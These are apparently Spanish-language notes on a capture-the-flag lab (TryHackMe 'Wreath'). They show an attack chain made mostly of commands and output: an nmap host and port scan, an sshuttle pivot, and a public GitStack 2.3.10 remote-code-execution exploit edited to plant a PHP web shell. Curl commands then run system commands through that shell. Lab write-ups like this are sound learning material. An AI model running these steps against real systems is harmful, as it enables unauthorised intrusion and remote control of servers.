- Ponemos el binario estatico de nmap en el serever `nmaphack`

- Escaneo con nmap
```bash
root@prod-serv ~]# ./nmaphack -sn 10.200.81.1/24 -oM scanhack1
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-12-19 02:48 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-1.eu-west-1.compute.internal (10.200.81.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 02:8C:E0:55:7B:89 (Unknown)
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Host is up (0.00030s latency).
MAC Address: 02:85:B0:59:FC:7D (Unknown)
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Host is up (0.00033s latency).
MAC Address: 02:2E:0D:98:55:45 (Unknown)
Nmap scan report for ip-10-200-81-250.eu-west-1.compute.internal (10.200.81.250)
Host is up (0.00068s latency).
MAC Address: 02:E7:4E:C8:80:A7 (Unknown)
Nmap scan report for ip-10-200-81-200.eu-west-1.compute.internal (10.200.81.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.82 seconds

```

- Las maquinas en question intereantes:

```cmd
10.200.194.100
10.200.194.150
```

- La que responde es 150
```bash
[root@prod-serv ~]# ./nmaphack 10.200.81.150 -T5 -n -Pn -v

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-12-19 02:56 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Initiating ARP Ping Scan at 02:56
Scanning 10.200.81.150 [1 port]
Completed ARP Ping Scan at 02:56, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:56
Scanning 10.200.81.150 [6150 ports]
Discovered open port 80/tcp on 10.200.81.150
Discovered open port 3389/tcp on 10.200.81.150
Discovered open port 5357/tcp on 10.200.81.150
Discovered open port 5985/tcp on 10.200.81.150
Warning: 10.200.81.150 giving up on port because retransmission cap hit (2).
Completed SYN Stealth Scan at 02:56, 19.48s elapsed (6150 total ports)
Nmap scan report for 10.200.81.150
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.012s latency).
Not shown: 6146 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:2E:0D:98:55:45 (Unknown)

Read data files from: /etc
Nmap done: 1 IP address (1 host up) scanned in 19.74 seconds
           Raw packets sent: 18461 (812.252KB) | Rcvd: 22 (952B)
[root@prod-serv ~]# 
```

- tuneleamos todo dentro de prod_serv con sshuttle
```
sshuttle -r root@10.200.81.200 10.200.81.0/24 --ssh-cmd "ssh -i id_rsa" -x 10.200.81.200
c : Connected to server.
```

- vamos al web con `http://10.200.81.150/`, `http://10.200.81.150/registration/login/`
- buscamos exploit y lo copiamos
```
searchsploit Gitstack           
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                           | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Met | windows/remote/44356.rb

GitStack 2.3.10 - Remote Code Execution                    | php/webapps/43777.py

----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

searchsploit -m 43777.py
  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43777
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/hackdata/tryhackme/wreath/43777.py

```

- Modificamos la ip del gitstack y el nombre del exploit
```python

ip = '10.200.81.150'



print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exphack.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exphack.php".for
```

- Ejecutamos el exploit para que se suba el exploit al server
```bash
python2.7 43777.py 
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system
" 
```

- Probamos comandos usando lo que se subio
```bash
curl -X POST 'http://10.200.81.150/web/exphack.php' -d 'a=dir'
" Volume in drive C has no label.
 Volume Serial Number is C0B9-B671

 Directory of C:\GitStack\gitphp

19/12/2022  03:31    <DIR>          .
19/12/2022  03:31    <DIR>          ..
08/11/2020  13:28    <DIR>          cache
08/11/2020  13:29    <DIR>          config
08/11/2020  13:28    <DIR>          css
08/11/2020  13:28    <DIR>          doc
19/12/2022  03:31                34 exphack.php
16/12/2022  21:02                34 exploit.php
08/11/2020  13:28    <DIR>          images
08/11/2020  13:28    <DIR>          include
16/05/2012  13:20             5,742 index.php
08/11/2020  13:28    <DIR>          js
08/11/2020  13:28    <DIR>          lib
08/11/2020  13:28    <DIR>          locale
18/12/2022  03:02                34 RZK90.php
08/11/2020  13:28    <DIR>          templates
08/11/2020  13:28    <DIR>          templates_c
               4 File(s)          5,844 bytes
              13 Dir(s)   7,196,475,392 bytes free
" 
```

- Probamos que tengamos conexion desde adentro, con `tcpdump`, `ping` , NOOOOOO !!! HAY !!

```bash
sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

```bash
curl -X POST 'http://10.200.81.150/web/exphack.php' -d 'a=ping%20-n%203%2010.50.82.110'
"
Pinging 10.50.82.110 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.82.110:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
```